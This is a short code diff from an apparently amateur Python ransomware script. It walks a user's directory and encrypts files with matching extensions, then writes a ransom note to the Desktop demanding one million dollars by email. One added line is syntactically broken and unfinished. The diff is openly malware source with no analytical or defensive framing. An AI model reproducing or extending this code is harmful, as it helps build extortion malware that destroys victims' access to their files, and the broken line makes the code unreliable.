@@ -10,6 +10,7 @@ def start(userdir):
             target = os.path.join(root,name)
             ext = os.path.splitext(name)
             if ext[1] in exts and ext[0][0] != "#" and ext[0][0] != "$":
+                if ext == ".ENSUIR" o
                 encrypt(target)
 
 
@@ -42,7 +43,7 @@ def note(userdir):
     lmao you got owned,
     I need 1 million dollars to ransomguy@gottem.com
     """
-    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT.txt")
+    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT")
     with open(notepath, 'w') as f:
         f.write(note)
 
